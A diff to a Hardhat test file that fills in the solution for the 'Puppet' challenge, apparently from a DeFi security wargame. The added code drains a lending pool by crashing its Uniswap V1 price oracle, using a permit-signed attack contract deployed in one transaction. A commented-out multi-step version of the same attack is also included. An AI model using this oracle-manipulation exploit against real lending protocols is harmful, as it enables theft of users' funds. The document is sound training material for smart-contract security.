@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,7 +95,40 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // // solution for more that 1 tx
+        // const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+
+        // await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(999n * 10n ** 18n, 1, deadline);
+
+        // const amountNeededToDrainETH = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: amountNeededToDrainETH});
+        // console.log(await token.balanceOf(player.address));
+        // console.log(POOL_INITIAL_TOKEN_BALANCE);
+
+        const attackContractAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: 0 // The contract deployment will be the player's first (and only) transaction
+        });
+
+        const { v, r, s } = await signERC2612Permit(
+            ethers.provider,
+            token.address,
+            player.address,
+            attackContractAddress,
+            ethers.constants.MaxUint256.toString()
+        );
+
+        await (await ethers.getContractFactory('AttackPuppet', player)).deploy(
+            token.address,
+            uniswapExchange.address,
+            lendingPool.address,
+            v,
+            r,
+            s,
+            {value: ethers.utils.parseEther("24")}
+        );
     });
 
     after(async function () {
